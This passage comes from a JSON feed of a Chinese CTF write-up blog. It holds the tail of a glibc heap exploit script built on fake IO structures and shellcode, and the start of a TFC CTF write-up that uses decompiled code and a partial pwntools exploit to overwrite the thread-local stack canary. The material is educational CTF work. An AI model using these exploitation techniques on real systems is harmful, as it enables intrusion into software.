string\">'mprotect'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"183\"></td><td><pre>\t\t\t\t            fake_io_2_addr <span class=\"token operator\">+</span> <span class=\"token number\">0x200</span></pre></td></tr><tr><td data-num=\"184\"></td><td><pre>\t\t\t\t        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"185\"></td><td><pre>\t\t\t\t        <span class=\"token number\">0x200</span><span class=\"token punctuation\">:</span> ShellcodeMall<span class=\"token punctuation\">.</span>amd64<span class=\"token punctuation\">.</span>cat_flag</pre></td></tr><tr><td data-num=\"186\"></td><td><pre>\t\t\t\t    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"187\"></td><td><pre>\t\t\t\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"188\"></td><td><pre>\t\t\t\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'car'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'guangzhou'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"189\"></td><td><pre>\t\t\t\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'car'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x521</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"190\"></td><td><pre>\t\t\t\tsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"191\"></td><td><pre>\t\t\t\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'train'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanchang'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'c'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"192\"></td><td><pre>\t\t\t\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'car'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanchang'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'fuzhou'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'d'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"193\"></td><td><pre>\t\t\t\tsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"194\"></td><td><pre>\t\t\t\tdele<span class=\"token punctuation\">(</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanchang'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"195\"></td><td><pre>\t\t\t\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'plane'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'fuzhou'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'guangzhou'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'c'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"196\"></td><td><pre>\t\t\t\tsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"197\"></td><td><pre>\t\t\t\tpl <span class=\"token operator\">=</span> <span class=\"token string\">b'h'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x4e0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x531</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"198\"></td><td><pre>\t\t\t\tpl <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>libcbase<span class=\"token operator\">+</span><span class=\"token number\">0x21b110</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>libcbase<span class=\"token operator\">+</span><span class=\"token number\">0x21b110</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"199\"></td><td><pre>\t\t\t\tpl <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>heapbase<span class=\"token operator\">+</span><span class=\"token number\">0x001eb0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"200\"></td><td><pre>\t\t\t\tpl <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>target<span class=\"token operator\">-</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"201\"></td><td><pre>\t\t\t\tedit<span class=\"token punctuation\">(</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'fuzhou'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1000</span><span class=\"token punctuation\">,</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"202\"></td><td><pre>\t\t\t\tsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"203\"></td><td><pre>\t\t\t\tdele<span class=\"token punctuation\">(</span><span class=\"token string\">'guangzhou'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"204\"></td><td><pre>\t\t\t\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'plane'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'fuzhou'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"205\"></td><td><pre>\t\t\t\tsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"206\"></td><td><pre>\t\t\t\tlg<span class=\"token punctuation\">(</span><span class=\"token string\">'point_guard_addr'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"207\"></td><td><pre>\t\t\t\tmenu<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"208\"></td><td><pre>\t\t\t\tresponse <span class=\"token operator\">=</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"209\"></td><td><pre>\t\t\t\tflag <span class=\"token operator\">=</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"210\"></td><td><pre>\t\t\t\t<span class=\"token comment\"># log.info(flag.decode())</span></pre></td></tr><tr><td data-num=\"211\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">if</span> <span class=\"token string\">'flag'</span> <span class=\"token keyword\">in</span> flag<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"212\"></td><td><pre>\t\t\t\t\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"213\"></td><td><pre>\t\t\t\t\tpause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"214\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"215\"></td><td><pre>\t\t\t<span class=\"token keyword\">except</span> EOFError<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"216\"></td><td><pre>\t\t\t\tlog<span class=\"token punctuation\">.</span>warning<span class=\"token punctuation\">(</span><span class=\"token string\">\"Connection lost, restarting the process.\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"217\"></td><td><pre>\t\t\t\tr<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"218\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"219\"></td><td><pre>\t\t\t<span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"220\"></td><td><pre>\t\t\t\tlog<span class=\"token punctuation\">.</span>warning<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"An error occurred: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>e<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"221\"></td><td><pre>\t\t\t\tr<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"222\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">continue</span></pre></td></tr></table></figure><blockquote>\n<p>参考</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucm9kZXJpY2tjaGFuLmNuL3poLWNuLzIwMjMtMDItMjctaG91c2Utb2YtYWxsLWFib3V0LWdsaWJjLWhlYXAtZXhwbG9pdGF0aW9uLyMyMjYtaG91c2Utb2YtYXBwbGUy\">https://www.roderickchan.cn/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/#226-house-of-apple2</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYnMua2FueHVlLmNvbS90aHJlYWQtMjczNDE4Lmh0bQ==\">https://bbs.kanxue.com/thread-273418.htm</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTI5MzQ/dGltZV9fMTMxMT1HcUd4dUQ5UWklM0RleGx4eDJEVXhZcUdLaXRxZTFRNzdPWllvRCN0b2MtOA==\">https://xz.aliyun.com/t/12934?time__1311=GqGxuD9Qi%3Dexlxx2DUxYqGKitqe1Q77OZYoD#toc-8</span></p>\n</blockquote>\n",
            "tags": [
                "house系列",
                "house-of-apple"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2024/08/06/TFCCTF_PWN/",
            "url": "https://yhuanhuan01.github.io/2024/08/06/TFCCTF_PWN/",
            "title": "TFCCTF_PWN",
            "date_published": "2024-08-06T07:51:19.000Z",
            "content_html": "<h1 id=\"tfc-ctf-pwn\"><a class=\"markdownIt-Anchor\" href=\"#tfc-ctf-pwn\">#</a> TFC CTF PWN</h1>\n<h3 id=\"guard-the-bypass\"><a class=\"markdownIt-Anchor\" href=\"#guard-the-bypass\">#</a> GUARD-THE-BYPASS</h3>\n<p>136 points\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tPWN</p>\n<p>Luma 63 solves\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t   \t\t    EASY</p>\n<blockquote>\n<p>Guard this cookie.</p>\n</blockquote>\n<blockquote>\n<p>Note: If you successfully create a working exploit in the provided Docker, ensure you try the exploit multiple times on the remote system if any issues arise.</p>\n</blockquote>\n<p>检查保护：</p>\n<pre><code>[*] '/home/yhuan/Desktop/chall/GUARD-THE-BYPASS/pwn'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x3fe000)\n    RUNPATH:  b'.'\n</code></pre>\n<p>开启 canary</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v5<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-14h] BYREF</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token class-name\">pthread_t</span> newthread<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+10h] [rbp-10h] BYREF</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v7<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+18h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  v7 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">setup</span><span class=\"token punctuation\">(</span>argc<span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">,</span> envp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Welcome! Press 1 to start the chall.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">__isoc99_scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v5 <span class=\"token operator\">!=</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Bye!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  len <span class=\"token operator\">=</span> <span class=\"token function\">get_len</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token function\">pthread_create</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>newthread<span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span> game<span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token function\">pthread_join</span><span class=\"token punctuation\">(</span>newthread<span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token keyword\">return</span> v7 <span class=\"token operator\">-</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">unsigned</span> __int64 __fastcall <span class=\"token function\">game</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>a1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  __int64 buf<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-30h] BYREF</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+28h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  v3 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  <span class=\"token function\">getchar</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>  <span class=\"token keyword\">return</span> v3 <span class=\"token operator\">-</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>要点</p>\n<blockquote>\n<p>pthread_create(&amp;newthread, 0LL, game, 0LL);</p>\n<p>read(0, buf, len);</p>\n</blockquote>\n<p>len 是我们给予，所以溢出我们控制。题目没有泄露 canary 的地方，采取覆盖 tls 上 canary，在调试环节，有些地方需要给与合法地址，所以在栈上布置合理即可。</p>\n<h4 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp:</h4>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>huan_attack_pwn</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># from LibcSearcher import *</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># context(arch='i386' , os='linux', log_level='debug')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>binary <span class=\"token operator\">=</span> <span class=\"token string\">'./pwn'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>libc <span class=\"token operator\">=</span> <span class=\"token string\">'./libc.so.6'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>host<span class=\"token punctuation\">,</span> port <span class=\"token operator\">=</span> <span class=\"token string\">\"challs.tfcctf.com:30558\"</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[31;40mremote\\033[0m: (y)\\n'</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token string\">'\\033[32;40mprocess\\033[0m: (n)'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">if</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'y'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># r = gdb.debug(binary)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary(libc)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>default <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>                <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> time<span class=\"token operator\">=</span>default             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>rpu     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">,</span>drop<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length                   <span class=\"token 